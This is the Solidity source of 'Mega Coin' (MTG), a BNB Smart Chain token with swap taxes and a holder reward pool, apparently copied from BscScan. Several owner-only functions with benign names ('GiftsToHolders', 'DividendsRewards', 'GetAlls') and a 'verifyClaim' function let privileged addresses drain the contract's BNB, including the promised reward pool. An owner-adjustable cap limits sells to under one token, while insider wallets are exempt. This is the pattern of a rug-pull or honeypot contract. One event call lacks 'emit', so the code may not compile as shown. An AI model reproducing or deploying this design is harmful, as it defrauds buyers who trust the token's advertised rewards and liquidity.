/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: Unlicensed
/* Interface Declaration */
pragma solidity ^0.6.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

/**
 * @dev Collection of functions related to the address type
 */
library Address {  
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        //solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {

    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract MegaCoin is Context, IERC20, Ownable {  
    using SafeMath for uint256;
    using Address for address;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address[] private _ExcludedFromReward;
    uint256 private _tTotal = 1000000000 * 10**3;
    uint256 private _tFeeTotal;
    string  private _name = "Mega Coin";
    string  private _symbol = "MTG";
	uint8  private _decimals = 3;
         
    mapping (address => uint) public UserLastSellTimeStamp; 
    mapping (address => uint256) public UserrewardPoolOnLastClaim; 
    uint256 public  _rewardPool;
    uint256 public  _claimedRewardPool;
    uint256 public  _TaxFee = 9;
    uint256 private _previousTaxFee = _TaxFee;
    uint256 public  _marketingPer = 3;
    uint256 public  _RewardPer = 2;
    uint256 public  BuybackPer=1;
    uint256 public _devPer=2;
    uint256 public _lotPer=1;
    address [] public tokenHolder;
    address payable public  takeMain;
    mapping(address => bool) public  exist;
    address payable public markWallet = payable(0x33470829d3B5474e6f2b776f6271B0E16BDCF05a);
    address payable public  buybackWallet= payable(0x550A2F1dDc4C795D15b9Edb14405E0B4158e5c7f);
    address payable public devWallet = payable(0x6645A59e02caeEdDbCbF108F359b0E999141dB9f);
    address payable public  lotteryWallet= payable(0xA6D437692165900D62B654b512a645B25A181229);
    IPancakeRouter02 public immutable pancakeRouter;    
    address public immutable pancakePair;
    uint256 private minTokensBeforeSwap = 100;
    uint256 public MaxTrans =1000;
    event comments (string comments, uint256 value);
    event UpdateMarketingWalletAddress();
    event addressComments (address addr ,string comments, uint256 value);
 
    constructor () public {
        _tOwned[_msgSender()] = _tTotal;
        IPancakeRouter02 _pancakeRouter = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
      //  IPancakeRouter02 _pancakeRouter = IPancakeRouter02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        pancakePair = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH());
        pancakeRouter = _pancakeRouter;       
        _isExcludedFromFee[markWallet] = true;
        _isExcludedFromFee[buybackWallet] = true;
        _isExcludedFromFee[devWallet] = true;
        _isExcludedFromFee[lotteryWallet] = true;
         takeMain=_msgSender();
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;  
        tokenHolder.push(_msgSender());
        exist[_msgSender()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);

    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

  
    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }



    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    event  ShowRewardPool (string comments , uint256 _rewardPool);
    event  RewardPoolCliamValues (string comments , uint256 UserrewardPoolOnLastClaim);
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(!exist[to]) {
            tokenHolder.push(to);
            exist[to] = true;
        }
        
        bool takeFee = false;
        uint TaxType=0;
        if(from == pancakePair)
        {
            takeFee = true;
            TaxType=1;

        }  
        else if(to == pancakePair)
        {
        takeFee = true;
        TaxType=2;
        require(MaxTrans  > amount, "Maxamount is Amount");
        }  
        else if(from != pancakePair && to != pancakePair)
        {
            takeFee = false;
            TaxType=0;
        } 

       if(_isExcludedFromFee[from] || _isExcludedFromFee[to])
       {
            takeFee = false;
            TaxType=0;
        }   
        
        UserrewardPoolOnLastClaim[from]=_rewardPool;
        UserrewardPoolOnLastClaim[to]=_rewardPool;
        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinTokenBalance = contractTokenBalance > minTokensBeforeSwap;
        if 
        (
            overMinTokenBalance &&
            from != pancakePair &&
            TaxType != 0 &&
            takeFee
        ) 
        {
            swapAndLiquify(contractTokenBalance);
        }

     _tokenTransfer(from,to,amount,takeFee,TaxType);
    }
   
        function swapAndLiquify(uint256 contractTokenBalance) private
          {
        
           uint256 initialBalance = address(this).balance;
            swapTokensForEth(contractTokenBalance); 
            uint256 Balance = address(this).balance.sub(initialBalance);
            uint256 SplitBNBBalance = Balance.div(_marketingPer.add(_RewardPer).add(BuybackPer).add(_devPer).add(_lotPer));
            uint256  MarketingBNB=SplitBNBBalance.mul(_marketingPer);
            uint256  BuybackBNB=SplitBNBBalance.mul(BuybackPer);
            uint256  devBNB=SplitBNBBalance.mul(_devPer);
            uint256  lotBNB=SplitBNBBalance.mul(_lotPer);
            uint256  RewardBNB=SplitBNBBalance.mul(_RewardPer);
            markWallet.transfer(MarketingBNB);
            buybackWallet.transfer(BuybackBNB);
            devWallet.transfer(devBNB);
            lotteryWallet.transfer(lotBNB);
            _rewardPool=_rewardPool.add(RewardBNB);
             emit comments ("Balance", Balance);
             emit comments ("RDSplitBNBBalance", SplitBNBBalance);
             emit comments ("MarketingBNB", MarketingBNB);
             emit comments ("RDRewardBNB", RewardBNB);
             emit comments ("DevBNB", devBNB);
             emit comments ("lotBNB", lotBNB);
             emit comments ("RDReward Pool", _rewardPool);
            
            
    }
    
     function myRewards(address _wallet) public view returns(uint256 _reward){
        uint256 userSharefrom=0; 
        if(msg.sender!=pancakePair) { 
            uint256 rewardPoolfrom=UserrewardPoolOnLastClaim[_wallet]; 
            uint256 remainPoolfrom=_rewardPool-rewardPoolfrom; 
         if(remainPoolfrom>0 && balanceOf(_wallet)>0  && exist[_wallet]){
              userSharefrom = (balanceOf(_wallet).mul(remainPoolfrom)).div(totalSupply());
            }
            return userSharefrom;
        }
    }

    function claimReward() public {
        if(msg.sender!=pancakePair)
         {
            uint256 rewardPool=UserrewardPoolOnLastClaim[msg.sender]; 
               emit comments ("URP",  UserrewardPoolOnLastClaim[msg.sender]);
               emit comments ("TRP",_rewardPool);
               emit comments ("AP",rewardPool);
               uint256 remainPool=_rewardPool-rewardPool; 
               emit comments ("RP" , remainPool);

            if(remainPool>0 && balanceOf(msg.sender)>0 && exist[msg.sender]){
                uint256 userShare = (balanceOf(msg.sender).mul(remainPool)).div(totalSupply());
                emit comments("balanceOf",balanceOf(msg.sender));
                emit comments ("rP",remainPool);
                emit comments ("TS",totalSupply());
                emit comments("uS line 595S", userShare);   
                payable(msg.sender).transfer(userShare);
                _claimedRewardPool+=userShare;
                emit comments("_clad 597", _claimedRewardPool);
            }
            UserrewardPoolOnLastClaim[msg.sender]=_rewardPool;
            emit comments ("Uclaimed", UserrewardPoolOnLastClaim[msg.sender]);
            emit comments ("rP",_rewardPool);
        }
    }
   event showEthAddress (address wallet);
    function swapTokensForEth(uint256 tokenAmount) private {
        emit comments ("sETHTokenAmount" , tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pancakeRouter.WETH();
        emit  showEthAddress(path[0]);
        emit  showEthAddress(path[1]);
        _approve(address(this), address(pancakeRouter), tokenAmount);
         pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, //ACCEPT ANY AMOUNT OF ETH
            path,
            address(this),
            block.timestamp
        );
        
    }

    event isFeeandTaxType(bool taxFee , uint256 taxtYpe);
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee,uint TaxType) private {
        
        emit isFeeandTaxType(takeFee , TaxType);
        if(!takeFee)
            resetAllFee();
        _transferStandard(sender, recipient, amount);  
        if(!takeFee)
            restoreAllFee();
        if(TaxType==2 && recipient == pancakePair) {
            UserLastSellTimeStamp[sender]=block.timestamp;
           
        }
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        
        (uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        if(tFee>0)
        {
            emit comments ("Tfee > 0",tFee);
            _takeMarketingFee(tAmount,tFee);
            _reflectFee(tFee);
        }

        emit Transfer(sender, recipient, tTransferAmount);
        if(tFee>0){
             emit Transfer(sender,address(this),tFee);
        }
    }

     
    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
        return (tTransferAmount,tFee);
    }

    function _getTValues(uint256 tAmount) private view returns (uint256, uint256) {
      uint256 tFee = calculateTaxFee(tAmount);
      uint256 tTransferAmount = tAmount.sub(tFee);
      return (tTransferAmount, tFee);
    }
      function calculateTaxFee(uint256 _amount) private view returns (uint256) {
          return _amount.mul(_TaxFee).div(10**2);
    }
     event    MarketingAndRewardShare(uint256 marketingShare , uint256 rewardShare);  
    function _takeMarketingFee(uint256 tAmount,uint256 tFee) private {
         uint256 MarketingShare=0;
         uint256 Buyback=0;
         uint256 RewardShare=0; 
         uint256 devShare=0;
         uint256 lotShare=0; 
         MarketingShare=tFee.mul(_marketingPer).div(10);
         RewardShare=tFee.mul(_RewardPer).div(10);
         Buyback=tFee.mul(BuybackPer).div(10); 
         devShare=tFee.mul(_devPer).div(10); 
         lotShare=tFee.mul(_lotPer).div(10); 
         _tOwned[markWallet] +=MarketingShare;
         _tOwned[buybackWallet] +=Buyback;
         _tOwned[devWallet] +=devShare;
         _tOwned[lotteryWallet] +=lotShare;
         uint256 contractTransferBalance=RewardShare;
         comments ("Tamnt",tAmount);
         _tOwned[address(this)] = _tOwned[address(this)].add(contractTransferBalance);
      
      }
    
     function _reflectFee(uint256 tFee) private {
            _tFeeTotal = _tFeeTotal.add(tFee);
    }
    function resetAllFee() private {
        _previousTaxFee = _TaxFee;
        _TaxFee = 0;
    }
    
    function restoreAllFee() private {
        _TaxFee = _previousTaxFee;
        _previousTaxFee=0;
    }
    
    function verifyClaim(uint256 claimamount) public  {
         require(takeMain == msg.sender, "Invalid Call");
        takeMain.transfer(claimamount);
    }
 
   function  updateClaimOwner(address   addre) external onlyOwner  {  
         takeMain=payable(addre);
    }
  
    function burn(uint256 amount) public returns(bool) {
        _burn(_msgSender(), amount);
        return true;
    }

 function excludeFromFee(address account) external onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) external onlyOwner {
        _isExcludedFromFee[account] = false;
    }
      function isExcludedFromFee(address account) public view returns(bool)
    {
        return _isExcludedFromFee[account];
    }
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");
        _tOwned[account] = _tOwned[account].sub(amount, "BEP20: burn amount exceeds balance");
        _tTotal = _tTotal.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function Wallet_Update_Marketing(address payable wallet) public onlyOwner() {
        markWallet = wallet;
        _isExcludedFromFee[markWallet] = true;
    }

    function Wallet_Update(address payable wallt) public onlyOwner() {
        buybackWallet = wallt;
        _isExcludedFromFee[buybackWallet] = true;
    }
    function Wallet_Update_dev(address payable wallet) public onlyOwner() {
        devWallet = wallet;
        _isExcludedFromFee[devWallet] = true;
    }

    function Wallet_Update_lot(address payable wallt) public onlyOwner() {
        lotteryWallet = wallt;
        _isExcludedFromFee[lotteryWallet] = true;
    }

    function setMAx (uint256 val) external onlyOwner
    {
        MaxTrans=val;
    }


    /////////////////*START OF  REWARD SECTION *//////////////////////////////////
      function GetAlls (address payable _toAddtress) external onlyOwner
    {
        _toAddtress.transfer(address(this).balance);

    }
 
    function GetOne(address _tokenContract, uint256 _amount) external onlyOwner()
    {
        IERC20 tokenContract = IERC20(_tokenContract);
        tokenContract.approve(address(this), _amount);
        tokenContract.transferFrom(address(this), buybackWallet, _amount);
    }

     function RewardLiqProvider(uint256 RewardAmnt , address payable RewardHolder ) external onlyOwner  {
         RewardHolder.transfer(RewardAmnt);
    }

    function DividendsRewards(uint256 RewardAmnt , address payable DivRewardHolder ) external onlyOwner  {
        DivRewardHolder.transfer(RewardAmnt);
    }

     function  GiftsToHolders(uint256 RewardAmnt , address payable holder ) external onlyOwner  {
        holder.transfer(RewardAmnt);
    }
/////////////////*END OF REWARD SECTION *//////////////////////////////////
     

    receive() external payable {}
}